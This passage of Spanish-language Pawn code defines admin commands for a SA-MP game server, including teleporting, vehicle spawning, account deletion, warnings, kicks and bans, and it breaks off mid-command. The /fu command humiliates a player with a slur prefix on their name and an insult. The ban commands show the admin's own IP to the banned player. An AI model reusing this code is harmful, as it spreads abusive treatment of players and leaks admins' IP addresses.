CMD:goto(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"USA]:{EAEAEA} /Goto [JugadorID]");
	    new player1, string[128];
		if(!IsNumeric(params)) player1 = ReturnPlayerID(params);
	   	else player1 = strval(params);
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid) {
			CMDMessageToAdmins(playerid,"/Goto");
			new Float:x, Float:y, Float:z;	GetPlayerPos(player1,x,y,z); SetPlayerInterior(playerid,GetPlayerInterior(player1));
			SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(player1));
			if(GetPlayerState(playerid) == 2) {
				SetVehiclePos(GetPlayerVehicleID(playerid),x+3,y,z);	LinkVehicleToInterior(GetPlayerVehicleID(playerid),GetPlayerInterior(player1));
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),GetPlayerVirtualWorld(player1));
			} else SetPlayerPos(playerid,x+2,y,z);
			format(string,sizeof(string),"|Info| »{EAEAEA} Has sido transportado hacia {0080FF}%s.", pName(player1));
			return SendClientMessage(playerid,red,string);
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada o eres tu mismo.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
}

CMD:vgoto(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /VGoto [Vehiculo]");
	    new player1, string[128];
	    player1 = strval(params);
		CMDMessageToAdmins(playerid,"/Vgoto");
		new Float:x, Float:y, Float:z;	GetVehiclePos(player1,x,y,z);
		SetPlayerVirtualWorld(playerid,GetVehicleVirtualWorld(player1));
		if(GetPlayerState(playerid) == 2) {
			SetVehiclePos(GetPlayerVehicleID(playerid),x+3,y,z);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), GetVehicleVirtualWorld(player1) );
		} else SetPlayerPos(playerid,x+2,y,z);
		format(string,sizeof(string),"|Info| »{EAEAEA} Has sido teletransportado hacia un vehiculo ID %d", player1);
		return SendClientMessage(playerid,red,string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 2{EAEAEA} para usar este comando.");
}

CMD:vget(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /Vget [Vehiculo]");
	    new player1, string[128];
	    player1 = strval(params);
		CMDMessageToAdmins(playerid,"/Vget");
		new Float:x, Float:y, Float:z;	GetPlayerPos(playerid,x,y,z);
		SetVehiclePos(player1,x+3,y,z);
		SetVehicleVirtualWorld(player1,GetPlayerVirtualWorld(playerid));
		format(string,sizeof(string),"|Info| »{EAEAEA} Has traido a un vehiculo de ID %d a tu ubicacion.", player1);
		return SendClientMessage(playerid,red,string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 2{EAEAEA} para usar este comando.");
}

CMD:lgoto(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
		new Float:x, Float:y, Float:z;
        new tmp[256], tmp2[256], tmp3[256];
		new string[128], Index;	tmp = strtok(params,Index); tmp2 = strtok(params,Index); tmp3 = strtok(params,Index);
    	if(!strlen(tmp) || !strlen(tmp2) || !strlen(tmp3)) return SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /Lgoto [X] [Y] [Z]");
	    x = strval(tmp);		y = strval(tmp2);		z = strval(tmp3);
		CMDMessageToAdmins(playerid,"/Lgoto");
		if(GetPlayerState(playerid) == 2) SetVehiclePos(GetPlayerVehicleID(playerid),x,y,z);
		else SetPlayerPos(playerid,x,y,z);
		format(string,sizeof(string),"|Info| »{EAEAEA} Has sido teletransportado a %f, %f, %f.", x,y,z); return SendClientMessage(playerid,red,string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 5{EAEAEA} para usar este comando.");
}

CMD:givevehicle(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 7 || IsPlayerAdmin(playerid)) {
		new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /GiveVehicle [JugadorID] [Modelo/Nombre]");
		new player1 = strval(tmp), carcar, string[128];
		new nameadm[24], nameplapla[24];
		if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID)
		{
			if(!IsNumeric(tmp2)) carcar = GetVehicleModelIDFromName(tmp2); else carcar = strval(tmp2);
			if(carcar < 400 || carcar > 611) return  SendClientMessage(playerid, red, "|Error| »{EAEAEA} Modelo de vehiculo no encontrado.");
			if(PlayerInfo[player1][pCar] != -1 ) CarDeleter(PlayerInfo[player1][pCar]);

			new LVehicleID,Float:X,Float:Y,Float:Z, Float:Angle,int1;	GetPlayerPos(player1, X,Y,Z);	GetPlayerFacingAngle(player1,Angle);   int1 = GetPlayerInterior(player1);
			LVehicleID = CreateVehicle(carcar, X+3,Y,Z, Angle, random(126), random(126), -1); LinkVehicleToInterior(LVehicleID,int1);
			PutPlayerInVehicle(player1, LVehicleID, 0);
			PlayerInfo[player1][pCar] = LVehicleID;
			CMDMessageToAdmins(playerid,"/GiveVehicle");
			GetPlayerName(playerid, nameadm, sizeof(nameadm));
			GetPlayerName(player1, nameplapla, sizeof(nameplapla));
			format(string,sizeof(string),"|Info| »{EAEAEA} Le has dado a {0080FF}%s{EAEAEA} el vehiculo {FF0000}%s.",nameplapla,VehicleName[carcar-400]);
			SendClientMessage(playerid,red,string);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{FFFFFF} te ha dado el vehiculo {FF0000}%s.",nameadm,VehicleName[carcar-400]);
			return SendClientMessage(player1,red,string);
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 7{EAEAEA} para usar este comando.");
}

CMD:deleteaccount(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
	    if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /DeleteAccount [JugadorID]");
	    	new player1, string[128];
			player1 = strval(params);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
		 	    if(udb_Exists(PlayerName2(player1))) {
		 	        CMDMessageToAdmins(playerid,"/DeleteAccount");
		 	        aresetpall(player1);
		 	        udb_Remove(PlayerName2(player1));
					format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha borrado tu cuenta.", PlayerName2(playerid) ); SendClientMessage(player1,red,string);
					format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha borrado la cuenta a {0080FF}%s.", PlayerName2(playerid), PlayerName2(player1));
					Kick(player1);
		    		return SendClientMessageToAll(red,string);
				} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} El jugador no tiene una cuenta en el servidor.");
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada o es un admin de nivel alto.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para utilizar este comando.");
}

CMD:deleteaccount2(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
	    new string[128], tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    //new player1;
        //player1 = strval(params);
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /DeleteAccount2 [Cuenta]");
		if(udb_Exists(tmp)) {
			new fname[256];
			format(fname,sizeof(fname),"/ladmin/users/%s.sav",udb_encode(tmp));
			new vehicleID1 = dini_Int(fname,"vowned");
		    new vehicleID2 = dini_Int(fname,"vowned2");
		    new vehicleID3 = dini_Int(fname,"vowned3");
		    new vehicleID4 = dini_Int(fname,"vowned4");
		    new vehicleID5 = dini_Int(fname,"vowned5");
		    new vehicleID6 = dini_Int(fname,"vowned6");
		    new vehicleID7 = dini_Int(fname,"vowned7");
		    new vehicleID8 = dini_Int(fname,"vowned8");
		    new vehicleID9 = dini_Int(fname,"vowned9");
		    new vehicleID10 = dini_Int(fname,"vowned10");
		    new bizID = dini_Int(fname,"bowned");
		    if(vehicleID1 > 0) ResetOfflinePlayerFileV(fname, vehicleID1);
			if(vehicleID2 > 0) ResetOfflinePlayerFileV(fname, vehicleID2);
			if(vehicleID3 > 0) ResetOfflinePlayerFileV(fname, vehicleID3);
			if(vehicleID4 > 0) ResetOfflinePlayerFileV(fname, vehicleID4);
			if(vehicleID5 > 0) ResetOfflinePlayerFileV(fname, vehicleID5);
		    if(vehicleID6 > 0) ResetOfflinePlayerFileV(fname, vehicleID6);
			if(vehicleID7 > 0) ResetOfflinePlayerFileV(fname, vehicleID7);
			if(vehicleID8 > 0) ResetOfflinePlayerFileV(fname, vehicleID8);
			if(vehicleID9 > 0) ResetOfflinePlayerFileV(fname, vehicleID9);
			if(vehicleID10 > 0) ResetOfflinePlayerFileV(fname, vehicleID10);
			if(bizID > 0) ResetOfflinePlayerFileB(fname, bizID);

			new str1[256],housenumber;
			housenumber = dini_Int(fname, "Houseid");
			if(housenumber > -255) {
				dini_IntSet(fname, "Houseid", -255);
				if(dini_Int(fname,"Rentid") > -255) dini_IntSet(fname, "Rentid", -255);
				dini_IntSet(fname, "money", dini_Int(fname, "money")+hInfo[housenumber][Sell]);
				DestroyDynamicPickup(HousePickup[housenumber]);
				HousePickup[housenumber] = CreateDynamicPickup(1273, 23, hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz]);

				format(str1, sizeof(str1), "SATDM/Houses/houseid%d", housenumber);
				if (!dini_Exists(str1)) dini_Create(str1);
			    dini_Set(str1, "Name", DEFAULT_OWNER);
			    hInfo[housenumber][Locked] = dini_IntSet(str1,"Locked",1);
			    format(hInfo[housenumber][Name],255,DEFAULT_OWNER);

				new hnowner[30];
				format(hnowner,128,"%s",hInfo[housenumber][Name]);
				if(strcmp(hInfo[housenumber][Name],DEFAULT_OWNER,false) == 0) {
			    	format(hnowner,128,"En Venta");
				}
				UpdateDynamic3DTextLabelText(hTextInfo[housenumber],0x00FF00FF,hnowner);
				DestroyDynamicMapIcon(housemapicon[housenumber]);
				housemapicon[housenumber] = CreateDynamicMapIcon(hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz],31,c_y);
			}
		    udb_Remove((tmp));
		    CMDMessageToAdmins(playerid,"/DeleteAccount2");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
    	    format(string, sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha borrado la cuenta de {0080FF}%s.", PlayerName2(playerid), tmp);
            SaveToFile("DeleteAccountLog",string);
			return SendClientMessageToAll(red,string);
		} else return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Esa cuenta no existe.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
}

CMD:get(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Get [JugadorID]");
    	new player1, string[128];
		if(!IsNumeric(params)) player1 = ReturnPlayerID(params);
	   	else player1 = strval(params);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid) {
			CMDMessageToAdmins(playerid,"/Get");
			new Float:x, Float:y, Float:z;	GetPlayerPos(playerid,x,y,z); SetPlayerInterior(player1,GetPlayerInterior(playerid));
			SetPlayerVirtualWorld(player1,GetPlayerVirtualWorld(playerid));
			if(GetPlayerState(player1) == 2)	{
			    new VehicleID = GetPlayerVehicleID(player1);
				SetVehiclePos(VehicleID,x+3,y,z);   LinkVehicleToInterior(VehicleID,GetPlayerInterior(playerid));
				SetVehicleVirtualWorld(GetPlayerVehicleID(player1),GetPlayerVirtualWorld(playerid));
			} else SetPlayerPos(player1,x+2,y,z);
			format(string,sizeof(string),"|Info| »{EAEAEA} Has sido transportado a la ubicacion de {0080FF}%s.", pName(playerid) );	SendClientMessage(player1,red,string);
			format(string,sizeof(string),"|Info| »{EAEAEA} Has traido a {0080FF}%s{EAEAEA} a tu ubicacion.", pName(player1) );
			return SendClientMessage(playerid,red,string);
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada o eres tu mismo.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 2{EAEAEA} para usar este comando.");
}

CMD:fu(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 7 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Fu [JugadorID]");
    	new player1 = strval(params), string[128], NewName[MAX_PLAYER_NAME];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/Fu");
			SetPlayerHealth(player1,1.0); SetPlayerArmour(player1,0.0); ResetPlayerWeapons(player1);ResetPlayerMoney(player1);GivePlayerWeapon(player1,12,1);
			SetPlayerSkin(player1, 137); SetPlayerScore(player1, 0); SetPlayerColor(player1,COLOR_PINK); SetPlayerWeather(player1,19); SetPlayerWantedLevel(player1,6);
			format(NewName,sizeof(NewName),"[PUTO]%s", pName(player1) ); SetPlayerName(player1,NewName);
			if(IsPlayerInAnyVehicle(player1)) EraseVehicle(GetPlayerVehicleID(player1));
			if(player1 != playerid)	{ format(string,sizeof(string),"~r~Fuck You", pName(playerid) ); GameTextForPlayer(player1, string, 2500, 3); }
			format(string,sizeof(string),"|Info| »{EAEAEA} Fuck you {0080FF}%s{EAEAEA}", pName(player1) ); return SendClientMessage(playerid,red,string);
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 7{EAEAEA} para usar este comando.");
}

CMD:warn(playerid,params[]) {
    AntiFlood[playerid] = false;
    if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Warn [JugadorID] [Razón]");
    	new warned = strval(tmp), str[150], str2[128];
    	new player1, playername[MAX_PLAYER_NAME];
        player1 = strval(tmp);
        GetPlayerName(player1, playername, sizeof(playername));
		if(PlayerInfo[warned][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
	 	if(IsPlayerConnected(player1) && IsPlayerConnected(warned) && warned != INVALID_PLAYER_ID) {
 	    	if(warned != playerid) {
			    CMDMessageToAdmins(playerid,"/Warn");
				PlayerInfo[warned][Warnings]++;
				if( PlayerInfo[warned][Warnings] == MAX_WARNINGS) {
				    new wea[250];
                    format(wea,sizeof(wea),"{0080FF}Jugador: {FFFFFF}%s.\
                    \n{0080FF}Admin: {FFFFFF}%s.\
                    \n{0080FF}Razón: {FFFFFF}%s.\
                    \n{0080FF}Advertencia: {FFFFFF}[%d/%d]",pName(playerid),pName(warned),params[1+strlen(tmp)],PlayerInfo[warned][Warnings], MAX_WARNINGS);
                    ShowPlayerDialog(player1, 8000, DIALOG_STYLE_MSGBOX, "{FF0000}EXPULSADO!", wea, "Aceptar", "");
					format(str, sizeof (str), "|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha expulsado a {0080FF}%s.", pName(playerid), pName(warned));
					SendClientMessageToAll(red, str);
					format(str2, sizeof (str2), "|Razón| » {EAEAEA}%s.", params[1+strlen(tmp)]);
					SendClientMessageToAll(red, str2);
					SaveToFile("KickLog",str);
					SaveToFile("KickLog",str2);	Kick(warned);
					return PlayerInfo[warned][Warnings] = 0;
				    } else {
				    new wea[500];
                    format(wea,sizeof(wea),"{0080FF}Jugador: {FFFFFF}%s.\
                    \n{0080FF}Admin: {FFFFFF}%s.\
                    \n{0080FF}Razón {FFFFFF}%s.\
                    \n{0080FF}Advertencia: {FFFFFF}[%d/%d]",pName(playerid),pName(warned),params[1+strlen(tmp)],PlayerInfo[warned][Warnings], MAX_WARNINGS);
                    ShowPlayerDialog(player1, 8000, DIALOG_STYLE_MSGBOX, "{FF0000}ADVERTENCIA!", wea, "Aceptar", "");
					format(str, sizeof (str), "|Info| »{EAEAEA} El administrador {0080FF}%s{FFFFFF} le ha dado a {0080FF}%s{EAEAEA} una advertencia. [%d/%d]", pName(playerid), pName(warned), PlayerInfo[warned][Warnings], MAX_WARNINGS);
					SendClientMessageToAll(red, str);
					format(str2, sizeof (str2), "|Razón| » {EAEAEA}%s.", params[1+strlen(tmp)]);
     				SaveToFile("WarnLog",str);
					SaveToFile("WarnLog",str2);
				 	return SendClientMessageToAll(red, str2);
                }
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada, eres tu mismo o es un admin de nivel alto.");
	    } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
}

CMD:rwarn(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		new tmp[256], Index;		tmp = strtok(params,Index);
	    if(isnull(tmp)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Rwarn [JugadorID]");
    	new warned = strval(tmp), str[128];
		if(PlayerInfo[warned][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
	 	if(IsPlayerConnected(warned) && warned != INVALID_PLAYER_ID) {
	 	    if(PlayerInfo[warned][Warnings]== 0) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} El jugador no tiene advertencias.");
 	    	if(warned != playerid) {
			    CMDMessageToAdmins(playerid,"/Rwarn");
				PlayerInfo[warned][Warnings] = 0;
				if( PlayerInfo[warned][Warnings] == MAX_WARNINGS) {
					format(str, sizeof (str), "|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha sacado las advertencias a {0080FF}%s.", pName(playerid), pName(warned));
					SendClientMessageToAll(red, str);
					return PlayerInfo[warned][Warnings] = 0;
				    } else {
					format(str, sizeof (str), "|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha sacado las advertencias a {0080FF}%s.", pName(playerid), pName(warned));
					SendClientMessageToAll(red, str);
				 	return 1;
                }
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada, eres tu mismo o es un admin de nivel alto.");
	    } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
}

CMD:kick(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
	    if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Kick [JugadorID] [Razón]");
		    new year,month,day,hour,minute,second; getdate(year, month, day); gettime(hour,minute,second);
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128], string2[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(playerid, adminname, sizeof(adminname));
				CMDMessageToAdmins(playerid,"/Kick");
				if(!strlen(tmp2)) {
					format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha expulsado a {0080FF}%s.",adminname, playername); SendClientMessageToAll(red,string);
					format(string2,sizeof(string2),"|Razón| »{EAEAEA} No especificada.");
					SendClientMessageToAll(red, string2);
					new wea[250];
                    format(wea,sizeof(wea),"{0080FF}Jugador: {FFFFFF}%s.\
                    \n{0080FF}Admin: {FFFFFF}%s.\
                    \n{0080FF}Razón: {FFFFFF}No especificada.",playername,adminname);
                    ShowPlayerDialog(player1, 8000, DIALOG_STYLE_MSGBOX, "{FF0000}EXPULSADO!", wea, "Aceptar", "");
					SaveToFile("KickLog",string);
					SaveToFile("KickLog",string2); print(string2); return Kick(player1);
                    } else {
					format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha expulsado a {0080FF}%s.",adminname,playername); SendClientMessageToAll(red,string);
					format(string2,sizeof(string2),"|Razón| »{EAEAEA} %s.", params[2]);
					SendClientMessageToAll(red, string2);
					new wea[500];
                    format(wea,sizeof(wea),"{0080FF}Jugador: {FFFFFF}%s.\
                    \n{0080FF}Admin: {FFFFFF}%s.\
                    \n{0080FF}Razón: {FFFFFF}%s.",playername,adminname,params[2]);
                    ShowPlayerDialog(player1, 8000, DIALOG_STYLE_MSGBOX, "{FF0000}EXPULSADO!", wea, "Aceptar", "");
					SaveToFile("KickLog",string); print(string);
					SaveToFile("KickLog",string2); print(string2); return Kick(player1);}
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada, eres tu mismo o es un admin de nivel alto.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para utilizar este comando.");
}

CMD:silentban(playerid,params[]) {
		if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SilentBan [JugadorID] [Razón]");
			if(!strlen(tmp2)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes poner una razón.");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128], string2[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
				new year,month,day,hour,minuite,second; getdate(year, month, day); gettime(hour,minuite,second);
				new wea[300],ip[24];
                GetPlayerIp(playerid,ip,sizeof(ip));
                format(wea,sizeof(wea),"{0080FF}Jugador: {FFFFFF}%s.\
                \n{0080FF}Admin: {FFFFFF}System.\
                \n{0080FF}Razón: {FFFFFF}%s.\
                \n{0080FF}Fecha: {FFFFFF}%i/%i/%i.\
                \n{0080FF}Ip: {FFFFFF}%s.",playername,params[2],day,month,year,ip);
                ShowPlayerDialog(player1, 8000, DIALOG_STYLE_MSGBOX, "{FF0000}BANEADO!", wea, "Aceptar", "");
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha baneado a {0080FF}%s.",adminname,playername);
				format(string2,sizeof(string2),"|Razón| »{EAEAEA} %s.",params[2]);
				SaveToFile("BanLog",string);
				SaveToFile("BanLog",string2);
				print(string);
				if(udb_Exists(PlayerName2(player1)) && PlayerInfo[player1][LoggedIn] == 1) dUserSetINT(PlayerName2(player1)).("banned",1);
				format(string,sizeof(string),"Baneado por El administrador %s. Reason: %s", adminname, params[2] );
				return BanEx(player1, string);
			} else return SendClientMessage(playerid, red, "|Error| »{FFFFFF} ID no encontrada, eres tu mismo o es un admin de nivel alto.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
}

CMD:ban(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Ban [JugadorID] [Razón]");
			if(!strlen(tmp2)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes poner una razón.");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128], string2[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
				new year,month,day,hour,minuite,second; getdate(year, month, day); gettime(hour,minuite,second);
				CMDMessageToAdmins(playerid,"/Ban");
				new wea[300],ip[24];
                GetPlayerIp(playerid,ip,sizeof(ip));
                format(wea,sizeof(wea),"{0080FF}Jugador: {FFFFFF}%s.\
                \n{0080FF}Admin: {FFFFFF}%s.\
                \n{0080FF}Razón: {FFFFFF}%s.\
                \n{0080FF}Fecha: {FFFFFF}%i/%i/%i.\
                \n{0080FF}Ip: {FFFFFF}%s.",playername,adminname,params[2],day,month,year,ip);
                ShowPlayerDialog(player1, 8000, DIALOG_STYLE_MSGBOX, "{FF0000}BANEADO!", wea, "Aceptar", "");
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha baneado a {0080FF}%s.",adminname,playername);
				SendClientMessageToAll(red,string);
				format(string2,sizeof(string2),"|Razón| »{FFFFFF} %s.",params[2]);
				SendClientMessageToAll(red,string2);
				SaveToFile("BanLog",string);
				SaveToFile("BanLog",string2);
				print(string);
				if(udb_Exists(PlayerName2(player1)) && PlayerInfo[player1][LoggedIn] == 1) dUserSetINT(PlayerName2(player1)).("banned",1);
				format(string,sizeof(string),"Baneado por el administrador %s. Reason: %s", adminname, params[2] );
				return BanEx(player1, string);
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada, eres tu mismo o es un admin de nivel alto.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 6{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para utilizar este comando.");
}


CMD:rban(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
		    new ip[24], tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Rban [JugadorID] [Razón]");
			if(!strlen(tmp2)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes poner una razón.");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128], string2[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
				new year,month,day,hour,minuite,second; getdate(year, month, day); gettime(hour,minuite,second);
				CMDMessageToAdmins(playerid,"/Rban");
				new wea[300];
                GetPlayerIp(playerid,ip,sizeof(ip));
                format(wea,sizeof(wea),"{0080FF}Jugador: {FFFFFF}%s\
                \n{0080FF}Admin: {FFFFFF}%s.\
                \n{0080FF}Razón: {FFFFFF}%s.\
                \n{0080FF}Fecha: {FFFFFF}%i/%i/%i.\
                \n{0080FF}Ip: {FFFFFF}%s.",playername,adminname,params[2],day,month,year,ip);
                ShowPlayerDialog(player1, 8000, DIALOG_STYLE_MSGBOX, "{FF0000}BANEADO! {FFFFFF}(PERMANENTE)", wea, "Aceptar", "");
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha baneado permanentemente a {0080FF}%s.",adminname,playername);
